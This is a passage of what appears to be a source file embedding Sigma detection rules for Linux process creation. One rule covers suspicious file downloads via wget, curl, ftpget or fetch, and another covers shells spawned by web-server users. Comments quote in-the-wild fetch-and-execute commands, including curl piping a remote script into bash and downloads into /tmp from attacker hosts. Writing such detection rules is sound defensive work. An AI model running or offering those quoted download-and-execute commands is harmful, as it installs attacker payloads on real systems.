    - https://www.picussecurity.com/resource/blog/handala-threat-group-tactics-targets-and-attack-timeline
    - https://www.picussecurity.com/resource/blog/showboat-malware-targeting-middle-east-telecom-firms-since-2022
    - https://socket.dev/blog/glasswasm-malware-open-vsx-extensions?utm_medium=feed
    - https://www.microsoft.com/en-us/security/blog/2026/06/02/preinstall-persistence-inside-red-hat-npm-miasma-credential-stealing-campaign/
    - https://www.stepsecurity.io/blog/binding-gyp-npm-supply-chain-attack-spreads-like-worm
    - https://www.fortinet.com/blog/threat-research/inside-cross-platform-propagation-of-new-gafgyt-variant-c0xmo
    - https://www.microsoft.com/en-us/security/blog/2026/05/22/from-edge-appliance-to-enterprise-compromise-multi-stage-linux-intrusion-via-f5-and-confluence/
    - https://www.ox.security/blog/new-actors-deploy-shai-hulud-clones-teampcp-copycats-are-here/
    - https://www.trendmicro.com/en_us/research/26/e/analyzing-teampcp-supply-chain-attacks.html
    - https://research.jfrog.com/post/shai-hulud-here-we-go-again/
    - https://opensourcemalware.com/blog/dprk-git-hooks-malware
    - https://socradar.io/blog/chinese-cybercrime-exploitation-harvesting/
    - https://isc.sans.edu/diary/rss/32936
    - https://snyk.io/blog/malicious-release-of-elementary-data-pypi-package-steals-cloud-credentials-from-data-engineers/
    - https://www.stepsecurity.io/blog/elementary-data-compromised-on-pypi-and-ghcr-forged-release-pushed-via-github-actions-script-injection
    - https://research.jfrog.com/post/xinference-compromise/s
    - https://flare.io/learn/resources/blog/teampcp-cloud-native-ransomware
    - https://censys.com/blog/comfyui-servers-cryptomining-proxy-botnet/
    - https://unit42.paloaltonetworks.com/modern-kubernetes-threats/
    - https://socket.dev/blog/axios-npm-package-compromised
    - https://www.akamai.com/blog/security-research/2026/feb/zerobot-malware-targets-n8n-automation-platform
    - https://thehackernews.com/2026/03/north-korean-hackers-publish-26-npm.html
    - https://kmsec.uk/blog/dprk-text-steganography/
    - https://x.com/ESETresearch/status/1960365364300087724
    - https://www.linkedin.com/posts/anton-cherepanov-b8653276_promptlock-activity-7366142680097017856-bVVY/
    - https://app.any.run/tasks/d0813b09-19f3-422c-8066-39d53c2eeead
    - https://threadreaderapp.com/thread/1960365364300087724.html
    - https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-022a
    - https://www.labs.greynoise.io/grimoire/2024-03-confluence-where-are-they-now/
    - https://research.checkpoint.com/2024/magnet-goblin-targets-publicly-facing-servers-using-1-day-vulnerabilities/
    - https://www.rapid7.com/blog/post/2023/11/06/etr-rapid7-observed-exploitation-of-atlassian-confluence-cve-2023-22518/
    - https://gbhackers.com/skidmap-malware-attacking-linux-distributions/
    - https://blog.viettelcybersecurity.com/cve-2022-21587-oracle-e-business-suite-unauth-rce/
    - https://github.com/hieuminhnv/CVE-2022-21587-POC/blob/main/exploit.py
    - https://www.rapid7.com/blog/post/2023/02/07/etr-cve-2022-21587-rapid7-observed-exploitation-of-oracle-e-business-suite-vulnerability/
    - https://hybrid-analysis.com/sample/f2e963dd8e751127369384ed8c49e9f37357c6db65731325f3e46643d23a8d10?environmentId=300
    - https://www.cadosecurity.com/migo-a-redis-miner-with-novel-system-weakening-techniques/
    - https://nao-sec.org/2024/10/IcePeony-with-the-996-work-culture.html
    - https://blog.eclecticiq.com/china-nexus-nation-state-actors-exploit-sap-netweaver-cve-2025-31324-to-target-critical-infrastructures
    - https://www.cert.ssi.gouv.fr/cti/CERTFR-2025-CTI-009/
    - https://www.wiz.io/blog/exposed-jdwp-exploited-in-the-wild
    - https://www.aquasec.com/blog/ai-generated-malware-in-panda-image-hides-persistent-linux-threat/
    - https://www.darktrace.com/blog/auto-color-backdoor-how-darktrace-thwarted-a-stealthy-linux-intrusion
    - https://www.oligo.security/blog/shadowray-2-0-attackers-turn-ai-against-itself-in-global-campaign-that-hijacks-ai-into-self-propagating-botnet
    - https://www.sentinelone.com/blog/defending-against-sha1-hulud-the-second-coming/
    - https://about.gitlab.com/blog/gitlab-discovers-widespread-npm-supply-chain-attack/
    - https://www.trendmicro.com/en_us/research/25/k/shai-hulud-2-0-targets-cloud-and-developer-systems.html
    - https://gist.github.com/joe-desimone/ff0cae0aa0d20965d502e7a97cbde3e3
    - https://thehackernews.com/2025/12/critical-rsc-bugs-in-react-and-nextjs.html
    - https://www.sysdig.com/blog/etherrat-dprk-uses-novel-ethereum-implant-in-react2shell-attacks
    - https://www.huntress.com/blog/peerblight-linux-backdoor-exploits-react2shell
    - https://cloud.google.com/blog/topics/threat-intelligence/threat-actors-exploit-react2shell-cve-2025-55182/
    - https://jp.security.ntt/insights_resources/tech_blog/react2shell_malware_zndoor/
    - https://beelzebub.ai/blog/threat-huntinga-analysis-of-a-nextjs-exploit-campaign/
    - https://detect.fyi/shai-hulud-2-0-campaign-be390e502f28
    - https://www.huntress.com/blog/evolving-linux-threat-landscape
    - https://www.picussecurity.com/resource/blog/t1059-004-unix-shell
tags:
    - attack.command_and_control
    - attack.t1105
logsource:
    category: process_creation
    product: linux
detection:
    selection:
        ParentImage|endswith:
            - 'sh' #bash / sh / zsh
            - 'crond'
        Image|endswith:
            - 'wget' # https://www.microsoft.com/en-us/security/blog/2026/06/02/preinstall-persistence-inside-red-hat-npm-miasma-credential-stealing-campaign/; https://www.picussecurity.com/resource/blog/handala-threat-group-tactics-targets-and-attack-timeline
            - 'curl' #curl -sL http://193.24.123.68:3001/gfdsgsdfhfsd_ghsfdgsfdgsdfg.sh -o ./s.sh 2>/dev/null; https://www.sysdig.com/blog/etherrat-dprk-uses-novel-ethereum-implant-in-react2shell-attacks; https://socradar.io/blog/chinese-cybercrime-exploitation-harvesting/
            - 'ftpget' #https://www.akamai.com/blog/security-research/2026/feb/zerobot-malware-targets-n8n-automation-platform
            - 'fetch' #fetch -o /tmp/1 hxxp://tnegadge[.]s3.amazonaws.com/dfuJ8t1uhG; https://www.picussecurity.com/resource/blog/t1059-004-unix-shell
    selection_action:
        - CommandLine|contains:
            - 'anonymous' #ftpget -v -u anonymous -p anonymous -P 21 xxx.xxx.xxx.xxx 2.sh 2.sh; https://www.akamai.com/blog/security-research/2026/feb/zerobot-malware-targets-n8n-automation-platform
        - CommandLine|contains|all:
            - 'http'
            - ' | ' #https://kmsec.uk/blog/dprk-text-steganography/; https://isc.sans.edu/diary/rss/32936; https://www.trendmicro.com/en_us/research/26/e/analyzing-teampcp-supply-chain-attacks.html; https://www.esentire.com/blog/more-shells-than-a-seafood-buffet-tracking-citrix-netscaler-exploitation-activities-cve-2026-88771
        - CommandLine|contains|all:
            - 'http' #https://www.huntress.com/blog/evolving-linux-threat-landscape; https://unit42.paloaltonetworks.com/modern-kubernetes-threats/; https://research.jfrog.com/post/xinference-compromise/; https://research.jfrog.com/post/shai-hulud-here-we-go-again/; https://www.fortinet.com/blog/threat-research/inside-cross-platform-propagation-of-new-gafgyt-variant-c0xmo; https://www.picussecurity.com/resource/blog/showboat-malware-targeting-middle-east-telecom-firms-since-2022
            - ' -o ' #https://cert.gov.ua/article/6318863; https://www.fortinet.com/blog/threat-research/clingstun-linux-backdoor-abuses-public-stun-infrastructure
        - CommandLine|contains|all:
            - 'http' #https://www.huntress.com/blog/evolving-linux-threat-landscape; https://webflow.sysdig.com/blog/jadepuffer-evolves-the-agentic-threat-actor-deploys-ransomware-built-to-destroy-ai-models
            - '/tmp' #https://socket.dev/blog/axios-npm-package-compromised; https://medium.com/@quirso_de/global-exploitation-of-cve-2026-59310-by-suspected-chinese-nexus-apt-related-cve-2026-59309-443a79e1466d; https://www.fortinet.com/blog/threat-research/multi-functional-linux-botnet-evooo1bot
        - CommandLine|contains|all:
            - 'file=@' #PromptLock pomt contains
            - 'http'
        - CommandLine|contains|all:
            - 'ftp://'
            - ' -o' # https://www.microsoft.com/en-us/security/blog/2026/05/22/from-edge-appliance-to-enterprise-compromise-multi-stage-linux-intrusion-via-f5-and-confluence/
    selection_pipe:
        CommandLine|contains|all:
            - 'curl' # curl -fsSL hxxp[:]//transfer[.]chinow[.]abrdns[.]com/get/psk_agent[.]sh | bash https://www.imperva.com/blog/stylesmuggler-exploitation-deploys-psk-agent-rat-against-magento-stores/; curl -fsSL https://bun.sh/install | bash; https://censys.com/blog/comfyui-servers-cryptomining-proxy-botnet/
            - 'http'
            - 'bash' # curl -fsSL hxxp[:]//transfer[.]chinow[.]abrdns[.]com/get/psk_agent[.]sh | bash https://www.imperva.com/blog/stylesmuggler-exploitation-deploys-psk-agent-rat-against-magento-stores/; https://www.stepsecurity.io/blog/elementary-data-compromised-on-pypi-and-ghcr-forged-release-pushed-via-github-actions-script-injection
    filters:
        CommandLine|contains:
            - 'apt-get'
            - '_replication' #elasticsearch req.
            - 'localhost'
            - '127.0.0.1'
            - '169.254.169.254'
            - 'SPHardwareDataType' #system_profiler SPHardwareDataType | awk '/Serial/ {print $4}
            - 'metadata.google.internal' #...lavor:Google' -O - http://metadata.google.internal/computeMetadata/v1/instance/id else c...
            - 'update.code.visualstudio.com'
            - 'dl.google.com'
            - 'github'
            - 'Homebrew'
            - 'cookie' #.../Homebrew/shims/shared/curl --disable --cookie /dev/null --globoff --show-err...
    condition: ((selection and selection_action) and not filters) or selection_pipe
falsepositives:
    - Administrative activity
level: low
"#,
  // Suspicious Shell via Web Server [Linux] (via process_creation)
  "67c6a54d-1660-435f-8ff3-bcdfb27af18f": r#"title: Suspicious Shell via Web Server [Linux] (via process_creation)
id: 67c6a54d-1660-435f-8ff3-bcdfb27af18f
description: Suspicious commands executed via a web server, which may suggest a vulnerability and remote shell access
status: stable
author: SOC Prime Team
references:
    - https://webflow.sysdig.com/blog/node2shell-cve-2026-111497-detecting-the-node-js-brotli-rce
    - https://www.elastic.co/security-labs/wp2shell-wordpress-rce-detection-elastic-defend
    - https://thehackernews.com/2024/12/apache-tomcat-vulnerability-cve-2024.html
    - https://securitylabs.datadoghq.com/articles/openssl-november-1-vulnerabilities/
    - https://www.hackercoolmagazine.com/uploading-shell-hacking-website-metasploit/
    - https://www.tecmint.com/best-open-source-web-servers/
    - https://www.redhat.com/sysadmin/favorite-shell
    - https://www.microsoft.com/en-us/security/blog/2026/04/02/cookie-controlled-php-webshells-tradecraft-linux-hosting-environments/
tags:
    - attack.t1505.003
    - attack.persistence
logsource:
  product: linux
  category: process_creation
detection:
  selection:
    User|contains:
      - 'apache'
      - 'nginx'
      - 'lighttpd'
      - 'tomcat' # CVE-2024-56337 / CVE-2024-50379
      - 'caddy'
      - 'lshttpd'
      - 'hiawatha'
      - 'node' # Node.js process https://webflow.sysdig.com/blog/node2shell-cve-2026-111497-detecting-the-node-js-brotli-rce
      - 'www'
      - 'www-data'
    Image|contains:
      - '/bash' # interactive shell https://webflow.sysdig.com/blog/node2shell-cve-2026-111497-detecting-the-node-js-brotli-rce
      - '/dash'
      - '/sh' # interactive shell https://webflow.sysdig.com/blog/node2shell-cve-2026-111497-detecting-the-node-js-brotli-rce
      - '/csh'
      - '/ksh'
      - '/zsh'
  filters:
    CommandLine|contains: 'MISP/app/Console/cake' # Misp
  condition: selection and not filters
falsepositives:
  - A web server component in network monitoring or management software may perform shell commands as part of normal operation.
level: medium
